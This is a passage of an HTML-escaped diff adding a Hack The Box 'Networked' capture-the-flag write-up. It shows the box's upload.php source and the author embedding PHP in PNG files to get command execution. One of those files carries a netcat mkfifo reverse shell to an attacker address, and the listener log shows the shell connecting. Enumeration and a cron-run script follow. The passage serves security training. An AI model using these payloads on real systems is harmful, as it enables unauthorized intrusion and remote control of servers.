+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;upload.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/lib.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UPLOAD_DIR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/uploads/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'submit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;myFile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;myFile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;check_file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;myFile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'myFile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;pre&amp;gt;Invalid image file.&amp;lt;/pre&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;displayform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;UPLOAD_ERR_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;p&amp;gt;An error occurred.&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;displayform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile[&quot;name&quot;];
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getnameUpload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$validext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.gif'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.jpeg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$validext&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr_compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;p&amp;gt;Invalid image file&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;displayform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REMOTE_ADDR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;nv&quot;&gt;$success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;UPLOAD_DIR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;p&amp;gt;Unable to save file.&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;p&amp;gt;file uploaded, refresh gallery&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// set proper permissions on the new file
+&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UPLOAD_DIR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0644&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;displayform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/upload.php&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/photos.php&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;rce--shell-as-apache&quot;&gt;RCE –&amp;gt; Shell as apache&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;We can use &lt;code class=&quot;highlighter-rouge&quot;&gt;upload.php&lt;/code&gt; to upload images then we can view them through &lt;code class=&quot;highlighter-rouge&quot;&gt;photos.php&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploads/image_name&lt;/code&gt;. For some time I tried to bypass the extension filter in &lt;code class=&quot;highlighter-rouge&quot;&gt;upload.php&lt;/code&gt; to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files but I wasn’t able to bypass it. However I could get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; by injecting &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code in the uploaded images.
+&lt;br /&gt;I got a solid black image and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;original.png&lt;/code&gt;, let’s upload it:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/6.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/networked/7.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/networked/8.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;Now let’s copy that image and inject some &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code into the new image:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# cp original.png ./test.png
+root@kali:~/Desktop/HTB/boxes/networked# echo '&amp;lt;?php' &amp;gt;&amp;gt; test.png
+root@kali:~/Desktop/HTB/boxes/networked# echo 'passthru(&quot;whoami&quot;);' &amp;gt;&amp;gt; test.png
+root@kali:~/Desktop/HTB/boxes/networked# echo '?&amp;gt;' &amp;gt;&amp;gt; test.png
+root@kali:~/Desktop/HTB/boxes/networked# mv test.png test.php.png
+root@kali:~/Desktop/HTB/boxes/networked# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I injected &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php passthru(&quot;whoami&quot;); ?&amp;gt;&lt;/code&gt; which should execute &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt;, let’s test it:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/9.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/10.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/networked/11.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;Now if we view the file from &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploads&lt;/code&gt; we won’t get the image, we’ll get the binary data of the image and the result of the executed &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code at the end:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/networked/12.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; got executed successfully and we’re the user &lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;.
+&lt;br /&gt;I created another one to get a reverse shell:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# cp original.png ./shell.php.png
+root@kali:~/Desktop/HTB/boxes/networked# echo '&amp;lt;?php' &amp;gt;&amp;gt; ./shell.php.png 
+root@kali:~/Desktop/HTB/boxes/networked# echo 'passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f&quot;);' &amp;gt;&amp;gt; ./shell.php.png 
+root@kali:~/Desktop/HTB/boxes/networked# echo '?&amp;gt;' &amp;gt;&amp;gt; ./shell.php.png 
+root@kali:~/Desktop/HTB/boxes/networked# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;And I got a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1337
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.10.146.
+Ncat: Connection from 10.10.10.146:55662.
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh-4.2$ hostname
+hostname
+networked.htb
+sh-4.2$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;command-injection-in-check_attackphp--shell-as-guly--user-flag&quot;&gt;Command Injection in check_attack.php –&amp;gt; Shell as guly –&amp;gt; User Flag&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;First thing I did after getting a shell was to make it stable:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sh-4.2$ which python
+which python
+/usr/bin/python
+sh-4.2$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+bash-4.2$ ^Z
+[1]+  Stopped                 nc -lvnp 1337
+root@kali:~/Desktop/HTB/boxes/networked# stty raw -echo
+root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1337
+
+bash-4.2$ export TERM=screen
+bash-4.2$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Then I started to enumerate the box, there was only one user on the box called &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ cd /home/
+bash-4.2$ ls -al
+total 0
+drwxr-xr-x.  3 root root  18 Jul  2 13:27 .
+dr-xr-xr-x. 17 root root 224 Jul  2 13:27 ..
+drwxr-xr-x.  2 guly guly 178 Nov 16 00:31 guly
+bash-4.2$ cd guly/
+bash-4.2$ ls -al
+total 32
+drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .
+drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..
+lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&amp;gt; /dev/null
+-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
+-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
+-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
+-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo
+-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
+-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
+-rw-------  1 guly guly 1920 Nov 16 00:27 dead.letter
+-r--------. 1 guly guly   33 Oct 30  2018 user.txt
+bash-4.2$ cat user.txt 
+cat: user.txt: Permission denied
+bash-4.2$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We can’t read the flag as &lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;, but there are some other interesting readable stuff, &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab.guly&lt;/code&gt; shows that &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/guly/check_attack.php&lt;/code&gt; gets executed as &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt; every 3 minutes:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php
+bash-4.2$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;check_attack.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;4.2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;check_attack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/lib.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/uploads/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$logpath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/tmp/attack.log'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$to&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'guly'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;X-Mailer: check_attack.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_grep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/^([^.])/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;scandir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
